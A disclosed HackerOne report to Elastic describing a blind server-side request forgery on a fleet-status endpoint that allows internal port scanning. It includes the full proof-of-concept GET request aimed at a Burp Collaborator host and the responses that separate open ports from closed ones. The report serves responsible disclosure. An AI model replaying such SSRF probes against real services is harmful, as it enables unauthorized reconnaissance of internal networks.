# blind Server-Side Request Forgery (SSRF)  allows scanning internal ports

## Report Details
- **Report ID**: 1300585
- **URL**: https://hackerone.com/reports/1300585
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-08-11T19:08:49.267Z
- **Disclosed**: 2023-05-05T06:34:31.254Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: elastic

## Vulnerability Information
hello dear support 

I found a Blind SSRF issue that allows scanning internal ports. on https://fleet-status.app.elstc.co

from this issue, you can check the server port 

HTTP request
===========
GET /api/v1/http/default/raw?regex=%22service.name%22:/s*%22(package-registry)%22&statusCodeMax=200&statusCodeMin=200&url=http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:22 HTTP/1.1
Host: fleet-status.app.elstc.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
Connection: close

if you add port 22 you will get  

{"type":"HTTP-RAW","status":"WARNING","label":"http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:22","message":"timeout/host unreachable"}


not open  

if you add  port 80 

response 
{"type":"HTTP-RAW","status":"FAILURE","label":"http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:80","value":{"values":["\u003chtml\u003e\u003cbody\u003eift3z4lojdng3fv7r68q5szjigz\u003c/body\u003e\u003c/html\u003e"],"unit":"RAW"}}

port 80 open

## Impact

Since this is a blind SSRF, it is not possible to read the response of HTTP requests. However this vulnerability can be used for reconnaissance.
Example: Port Scan by measuring response time

## Attachments
No attachments
